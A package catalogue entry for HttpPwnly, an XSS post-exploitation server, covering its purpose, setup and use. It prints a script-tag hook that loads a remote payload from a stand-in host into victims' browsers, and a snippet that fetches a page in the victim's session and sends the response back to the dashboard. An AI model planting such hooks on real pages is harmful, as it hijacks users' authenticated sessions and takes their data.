---
name: "httppwnly"
categories:
  - blackarch-webapp
version: "47.528a664"
homepage: "https://github.com/Danladi/HttpPwnly"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "Danladi/HttpPwnly"
github-stars: 137
github-pushed: "2017-12-22"
github-archived: false
github-issues: 2
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# httppwnly

> "Repeater"-style XSS post-exploitation server: hooks victims' browsers through an injected script tag and queues tasks that run in their sessions.

## What it's for

HttpPwnly is a proof-of-concept for why the HttpOnly cookie flag is not a complete defense against session abuse once XSS exists. You inject its `payload.js` reference into a vulnerable page; every browser that renders the page loads the payload and connects back to the HttpPwnly server, where you queue "Repeater"-style tasks — fetch a URL as the victim, run JavaScript in their session — and watch each victim's responses on a dashboard. For realistic use it belongs behind a reverse proxy serving both HTTP and HTTPS with a valid certificate (the payload must load from both scheme origins), and it is Python 2 era tooling (the packaged command runs it under python2). It is post-exploitation tooling: it needs an XSS (or HTML injection) you already control.

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Start the command server

Bring up the listener and admin dashboard.

```
httppwnly
```

Outcome: binds to localhost:5000 and prints a randomly generated password for the `admin` user; log in at `/login` (through your reverse proxy) to reach `/dashboard` where hooked browsers and task results appear.

### Hook a victim browser

The snippet that must run on the vulnerable page.

```html
<script id="hacker" src="//payload.example.com/payload.js"></script>
```

Outcome: any browser rendering the injected tag loads `payload.js` and opens a control channel to the server; the victim shows up on the dashboard, where tasks can be queued against it — cookies stay HttpOnly, yet requests are still made from the victim's authenticated session.

### Return output from asynchronous payloads

Get task results that arrive after the task function returns.

```javascript
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function() {
  if (xmlhttp.readyState == 4) {
    sendOutput(id, xmlhttp.responseText);
  }
};
xmlhttp.open("GET", "/", true);
xmlhttp.send();
```

Outcome: when the request completes, `sendOutput(id, data)` delivers the response text to the dashboard under the task's id — the pattern for any custom payload whose result is produced asynchronously.
